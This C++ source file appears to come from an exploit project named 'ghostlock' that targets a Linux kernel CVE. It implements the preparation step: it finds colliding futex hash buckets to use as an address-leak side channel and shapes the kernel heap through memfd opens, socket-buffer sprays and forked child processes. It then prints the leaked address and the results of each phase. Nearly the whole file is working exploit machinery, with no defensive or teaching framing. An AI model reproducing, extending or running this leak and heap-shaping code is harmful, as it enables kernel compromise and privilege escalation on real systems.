/** @file backend/cve_2026_43499/steps/prepare_runner.cpp
 *  The preparation, the device probe"s recipe. See the header.
 */
#include "backend/cve_2026_43499/steps/prepare_runner.hpp"
#include "backend/cve_2026_43499/steps/words_region.hpp"

#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
#include "backend/cve_2026_43499/leak/futex_hash.hpp"
#include "backend/cve_2026_43499/leak/snitch_policy.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        using DeviceSeam = leak::LinuxSnitchSeam;
        struct CompositeSeam final {
            static leak::MapResult map_shared(std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::map_shared(bytes); }
            static memory::SeamResult unmap(void *address, std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::unmap(address, bytes); }
            static memory::SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
                return leak::LinuxSnitchSeam::futex_wait_private(word, expected);
            }
            static memory::SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                              std::int64_t timeout_us) noexcept {
                return leak::LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
            }
            static memory::SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
                return leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
            }
            static leak::ThreadResult start_thread(leak::ThreadEntry entry, void *argument) noexcept {
                return leak::LinuxSnitchSeam::start_thread(entry, argument);
            }
            static memory::SeamResult join_thread(unsigned long handle) noexcept { return leak::LinuxSnitchSeam::join_thread(handle); }
            static memory::SeamResult page_size() noexcept { return memory::LinuxHeapSeam::page_size(); }
            static memory::SeamResult open_memfd(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::open_memfd(pid); }
            static memory::SeamResult close_fd(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::close_fd(fd); }
            static memory::SeamResult socket_pair(std::int32_t *out) noexcept { return memory::LinuxHeapSeam::socket_pair(out); }
            static memory::SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
                return memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
            }
            static memory::SeamResult set_nonblocking(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::set_nonblocking(fd); }
            static memory::SeamResult send_bytes(std::int32_t fd, const void *data,
                                                 std::size_t bytes) noexcept {
                return memory::LinuxHeapSeam::send_bytes(fd, data, bytes);
            }
            static memory::SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
                return memory::LinuxHeapSeam::send_buffer(fd, bytes);
            }
            static memory::SeamResult fork_child() noexcept { return memory::LinuxHeapSeam::fork_child(); }
            static memory::SeamResult stop_child(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::stop_child(pid); }
            static memory::SeamResult yield_now() noexcept { return memory::LinuxHeapSeam::yield_now(); }
            static memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept { return memory::LinuxHeapSeam::pin_to_processor(cpu); }
            static void exit_child() noexcept { memory::LinuxHeapSeam::exit_child(); }
        };
        using DevicePolicy = leak::SnitchPolicy<CompositeSeam, leak::CollisionBuckets>;
        /* 这四个名字是这一段的具名依据（区大小/步长/两条拒绝名）；实现改走 words_region 的
         *  几何后编译期不再引用 —— 保留名字并显式标注，别让零告警线把它们删成查不到的字符串。 */
        [[maybe_unused]] inline constexpr std::size_t kWordsBytes = 64U * 1024U;
        [[maybe_unused]] inline constexpr std::size_t kWordsStride = 64U;
        [[maybe_unused]] inline constexpr const char *kProofsMissing = "prepare-proofs-missing";
        [[maybe_unused]] inline constexpr const char *kWordsUnmapped = "prepare-words-unmapped";
    }  // namespace

    bool run_prepare(PrepareRequest &request, PrepareReport &out, const char **refusal) noexcept {
        if (request.proof_count == 0U || request.proof_count > 4U) {
            *refusal = "prepare-proof-count-bad";
            return false;
        }
        leak::CollisionBuckets buckets{};
        if (leak::futex_hash_context_init(&buckets.context, request.setup.futex_table_size) != 0) {
            *refusal = "prepare-hash-init-failed";
            return false;
        }
        /* mm 参与键：私有 futex 上两侧同值即可，先用 0。 */
        buckets.mm = 0U;

        /* 证明地址那一轮扫描已删：策略比的是**字所在的桶**（words），不是这里。 */
        if (request.words == nullptr) { *refusal = "prepare-words-region-missing"; return false; }
        if (!request.words->place(request.proof_count, buckets)) { *refusal = "prepare-no-colliding-words"; return false; }
        std::uint32_t *words[4] = {};
        std::uint64_t word_addresses[4] = {};
        for (std::size_t i = 0U; i < request.proof_count; ++i) {
            words[i] = request.words->word(i);
            word_addresses[i] = request.words->address(i);
        }

        DevicePolicy policy{};
        policy.buckets = &buckets;
        policy.args.setup = request.setup;
        policy.args.region = request.region;
        policy.args.patience = request.patience;
        policy.args.counter_offset = request.counter_offset;
        policy.args.words = words;
        policy.args.word_count = request.proof_count;
        policy.args.strides = request.strides;
        policy.args.range = request.range;
        policy.args.sweep_tags = false;
        policy.args.addresses = word_addresses;   /* 规则比的是字所在的桶，不是证明地址 */
        policy.args.address_count = request.proof_count;

        /* 几何：用单元自己的公式（region_for / send_size_for），不自写 ×8 / ×2。 */
        if (request.page_size == 0U) { *refusal = "prepare-page-size-missing"; return false; }
        request.geometry.align_region_size = memory::region_for(request.page_size);
        if (request.geometry.align_region_size == 0U) { *refusal = "prepare-region-size-zero"; return false; }
        request.geometry.send_size = static_cast<std::size_t>(memory::send_size_for(request.geometry.align_region_size));
        /* region 与 object 也必须与设备几何一致（单元判的就是这个）：region = region_for(page)，
         *  object = 页大小。此处覆盖调用方可能带来的别的 region 值。 */
        request.inputs.region_size = request.geometry.align_region_size;
        request.inputs.object_size = request.page_size;
        /* 先自己启动一次搜索（探针的配方就是如此），并在单元跑到之前把**真实**结论打出来：
         *  单元在失败路径会 reset()，之后再读 outcome 只会看到默认值（这一点我已踩过）。 */
        static_cast<void>(policy.start(request.proof_count));
        std::printf("main: snitch real verdict=%s probes=%zu rounds=%u found=0x%llx\n",
                    leak::run_verdict_name(policy.outcome.status), policy.outcome.probes,
                    policy.outcome.rounds, static_cast<unsigned long long>(policy.outcome.found));
        const memory::PrepareOutcome prepared =
                memory::prepare_page<CompositeSeam, DevicePolicy>(request.inputs, request.geometry,
                                                                  request.waiting, policy);
        /* 把策略自己的判决也带出来：LeakLoop 问的就是它，看不到它就只能猜。 */
        out.snitch_loop_saw = prepared.snitch_found;
        out.snitch_loop_address = prepared.snitch_address;
        out.snitch_verdict = leak::run_verdict_name(policy.outcome.status);
        out.snitch_probes = policy.outcome.probes;
        out.snitch_rounds = policy.outcome.rounds;
        out.snitch_found = policy.outcome.found;
        /* 几何拒绝时把策略拿到的输入也带出来：它与发现那段用的是同一批值，差在哪一眼可见。 */
        if (policy.outcome.probes == 0U && policy.outcome.rounds == 0U) {
            /* 用单元自己的函数复算两项子检查：区域能不能排、pokes 数是不是零。 */
            leak::RegionLayout layout{};
            const leak::RegionVerdict region_verdict = leak::layout_snitch_region(request.region, layout);
            const std::size_t wanted = leak::total_futex_pokes(request.setup.futex_table_size,
                                                             request.setup.collisions);
            std::printf("main: snitch args wake=%u counter=%zu words=%zu collisions=%zu table=%u\n",
                        request.patience.wake_rounds, request.counter_offset, request.proof_count,
                        request.setup.collisions, request.setup.futex_table_size);
            std::printf("main: snitch checks region=%s total=%zu counter_ok=%d wanted=%zu words_ok=%d\n",
                        leak::region_verdict_name(region_verdict), layout.total_bytes,
                        request.counter_offset < layout.total_bytes ? 1 : 0, wanted,
                        request.proof_count >= request.setup.collisions ? 1 : 0);
        }
        out.status = memory::prepare_status_name(prepared.status);
        out.snitch_loop_saw = prepared.snitch_found;
        out.snitch_loop_address = prepared.snitch_address;
        out.at_step = static_cast<int>(prepared.at_step);
        out.opened = prepared.opened;
        out.closed = prepared.closed;
        out.base = prepared.base;
        out.shaping_fd = prepared.shaping_fd;   /* 选项 B 的通道 ✓ */
        out.shaping_peer_fd = prepared.shaping_peer_fd;
        out.error = prepared.error;
        out.opened_pre = prepared.opened_pre;
        out.opened_spray = prepared.opened_spray;
        out.opened_post = prepared.opened_post;
        out.opened_leak = prepared.opened_leak;
        out.closed_pre = prepared.closed_pre;
        out.closed_spray = prepared.closed_spray;
        out.closed_post = prepared.closed_post;
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
